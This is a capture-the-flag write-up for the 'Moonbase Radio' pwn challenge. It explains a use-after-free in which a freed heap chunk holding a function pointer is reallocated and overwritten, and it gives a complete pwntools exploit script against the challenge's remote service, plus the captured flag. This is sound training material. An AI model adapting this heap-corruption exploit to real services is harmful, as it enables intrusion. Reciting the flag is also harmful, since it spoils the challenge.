---
title: "Moonbase Radio"
ctf: "Safaricom CTF"
date: 2026-10-06
category: pwn
difficulty: medium
points: 500
flag_format: "safctf{...}"
author: "Strawhats"
---

# Moonbase Radio

> **Category:** PWN · **Points:** 500 · **Difficulty:** medium

## Discovery, analysis & exploitation

The full hunt below is reproduced from our working notes — recon, fingerprinting, the bug, dead ends, and the path to the flag.

- Desk page: `http://54.72.82.22:8620/` (themed SPACE RADIO)
- Binary: `http://54.72.82.22:8620/downloads/receipt` (raw ELF, no extension)
  - sha256 `2c45100895988a3b4aede7c6e2723970ff46d53351ad62104ef528b32b8ed606`
  - Local copy kept as `receipt` (binary extensions are gitignored — NOT committed)
- Remote service: `nc 54.72.82.22 8750`, banner is a bare `Moonbase Radio\n`

## Triage

`file receipt` -> ELF 64-bit LSB **PIE**, dynamically linked, **stripped**.
`checksec` -> Partial RELRO, **No canary**, NX enabled, PIE enabled.

The service prints only the banner and then calls `scanf("%u", &option)` in a loop
(no prompt). The four menu options map to the small main loop at `0x1275`:

| option | code | behaviour |
|--------|------|-----------|
| 1 | `0x12d6` | `p = malloc(0x40); memset(p,0,0x40); *(p+0x38)=0x124e; printf("channel=%p\n", *(p+0x38))` |
| 2 | `0x1329` | `if (p1) free(p1);` — **p1 is never nulled** |
| 3 | `0x1346` | `p2 = malloc(0x40); fread(p2, 1, 0x40, stdin)` |
| 4 | `0x137e` | `if (p1) { rdx = *(p1+0x38); call rdx; }` |

`0x124e` is the `puts("Silence between songs.")` stub stored as a function pointer.

## Bug — use-after-free / arbitrary call

`free` in option 2 leaves the pointer live, and option 3 hands back the *same*
0x40 tcache chunk (LIFO) and lets us `fread` 0x40 fully controlled bytes over it.
So `*(chunk+0x38)` becomes attacker-controlled, and option 4 calls it.

Also present (but not needed): a **dead win function at `0x1264`** (not referenced
anywhere), which does `fopen("/run/receipt","r"); fgets(buf,0xa0,f); puts(buf)`.
The binary's own name/URL is `receipt` and the path it opens is `/run/receipt`,
i.e. this is the intended ret2win — it prints the receipt file, which on the
server holds the flag.

## Exploit (see solve.py)

1. option 1 -> `printf("channel=%p", 0x124e)` leaks a PIE code pointer => `base = leak - 0x124e`.
2. option 2 -> `free(chunk)` (dangling pointer kept).
3. option 3 -> `malloc(0x40)` returns the freed chunk; `fread` writes
   `b"A"*0x38 + p64(base+0x1264)` over it (also clobbers tcache fd/key, harmless).
4. option 4 -> `call *(chunk+0x38)` == win -> prints `/run/receipt`.

The call needs no argument control (the win function takes none), so the
uncontrolled `rdi` at the call site does not matter. No libc leak / shell needed.

## Result

```
channel=0x56ce111b324e
```
Reproduced across runs (ASLR changes the leak, flag is stable).

## Solve script

`pwn/moonbase-radio/solve.py`:

```python
#!/usr/bin/env python3
"""Moonbase Radio (Safaricom CTF, pwn).

Remote: 54.72.82.22:8750   Binary: http://54.72.82.22:8620/downloads/receipt
sha256 2c45100895988a3b4aede7c6e2723970ff46d53351ad62104ef528b32b8ed606

Vulnerability (use-after-free):
  menu 1 -> malloc(0x40) chunk A, memset, A[0x38] = fn(0x124e), printf("channel=%p", fn)  [PIE leak]
  menu 2 -> free(A) but the pointer is NOT nulled              <-- UAF
  menu 3 -> malloc(0x40) into pointer2 then fread(ptr2, 1, 0x40, stdin)
            (tcache LIFO returns chunk A, so fread overwrites A incl. A[0x38])
  menu 4 -> if A: rdx = A[0x38]; call rdx     <-- arbitrary call of a controlled pointer

Exploit: leak PIE base from menu 1, free via menu 2, re-alloc via menu 3 and write
  0x38 filler + p64(win) with win = base + 0x1264  (dead function that opens
  "/run/receipt" and puts its contents), then trigger it with menu 4.
"""
import re
import sys
from pwn import context, remote, p64

context.log_level = "info"

HOST = "54.72.82.22"
PORT = 8750

LEAK_FN = 0x124E   # address printed by menu option 1
WIN     = 0x1264   # function() { char b[0xa0]; fopen("/run/receipt","r"); fgets; puts; }


def main():
    r = remote(HOST, PORT)

    # Banner is a bare "Moonbase Radio\n"; the menu reads scanf("%u") with no prompt.
    r.recvline(timeout=3)

    # Menu 1: allocate + leak PIE code pointer
    r.sendline(b"1")
    data = r.recvuntil(b"\n", timeout=3)
    print("[*] leak line:", data)
    m = re.search(rb"channel=(0x[0-9a-fA-F]+)", data)
    if not m:
        print("[!] no leak, got:", data)
        sys.exit(1)
    leak = int(m.group(1), 16)
    base = leak - LEAK_FN
    win = base + WIN
    print(f"[*] leak={leak:#x}  pie_base={base:#x}  win={win:#x}")

    # Menu 2: free chunk A (dangling pointer kept)
    r.sendline(b"2")

    # Menu 3: malloc returns A from tcache; fread 0x40 bytes we control
    r.sendline(b"3")
    payload = b"A" * 0x38 + p64(win)
    assert len(payload) == 0x40
    r.send(payload)

    # Menu 4: call *(A + 0x38) == win  -> prints /run/receipt
    r.sendline(b"4")

    out = r.recvrepeat(3)
    print(out.decode("latin-1", "replace"))

    mm = re.search(rb"safctf\{[0-9a-fA-F]+\}", out)
    if mm:
        print("FLAG:", mm.group(0).decode())
    r.close()


if __name__ == "__main__":
    main()
```

## Tools

**Used in this solve:**

- pwntools
- Python 3 (solver)
- checksec

**Other tools that fit this category:**

- pwntools (exploit dev)
- GDB + pwndbg/GEF
- Ghidra / IDA (static)
- radare2 / rizin
- ROPgadget / ropper
- one_gadget
- checksec, patchelf

## Flag

```
safctf{d8e20273d4d4cd65472f84b4316666eb}
```
